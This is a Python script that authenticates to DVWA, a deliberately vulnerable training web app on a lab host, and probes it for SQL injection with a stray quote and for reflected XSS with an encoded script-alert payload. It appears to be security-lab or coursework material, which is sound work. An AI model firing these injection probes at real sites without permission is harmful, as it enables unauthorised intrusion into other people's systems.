import requests
import re
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning

PARSER: str = "html.parser"

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
# URL for Lamp1
base_url = "http://lamp1/DVWA"


def authenticate(username, password):
    with requests.Session() as ssn:
        login_page = ssn.get("http://lamp1/DVWA/login.php")
        soup = BeautifulSoup(login_page.text, PARSER)
        # Get the user_token value passed in a hidden input field
        user_token = soup.find("input", {"name": "user_token"})["value"]
        # print(user_token)
        payload = {
            "username": username,
            "password": password,
            "Login": "Login",
            "user_token": user_token,
        }
        ssn.post(
            url="http://lamp1/DVWA/login.php", allow_redirects=True, data=payload
        )
        return ssn


def sql_i(url, ssn):
    sqli_pattern = re.compile("error in your SQL syntax")
    sqli_output = ssn.get(url)
    sqli_output_soup = BeautifulSoup(sqli_output.content, PARSER)
    if re.search(sqli_pattern, str(sqli_output_soup)):
        return True
    else:
        return False


def xss_reflected(url, ssn):
    xss_found = False
    xss_pattern = re.compile("alert")
    xss_reflected_output = ssn.get(url)
    reflected_xss_soup = BeautifulSoup(xss_reflected_output.content, PARSER)
    for i in reflected_xss_soup.findAll("script"):
        xss_result = xss_pattern.match("".join(i.contents))
        if xss_result:
            print(
                "Reflected XSS Success: {} found in script tags".format(
                    "".join(i.contents)
                )
            )
            xss_found = True

    if xss_found:
        return True
    else:
        return False


session = authenticate("admin", "password")
session.cookies.set("security", "low", path="/DVWA", domain="lamp1.local")

if sql_i("http://lamp1/DVWA/vulnerabilities/sqli/?id=%27&Submit=Submit", ssn=session):
    print("SQL Injection Detected")
else:
    print("SQL Injection not found")

if xss_reflected(
    "http://lamp1/DVWA/vulnerabilities/xss_r/?name=%29andy%3Cscript%3Ealert%28%271%27%29%3C%2Fscript%3E#",
    session
):
    print("Reflected XSS Detected")
else:
    print("Reflected XSS not found")
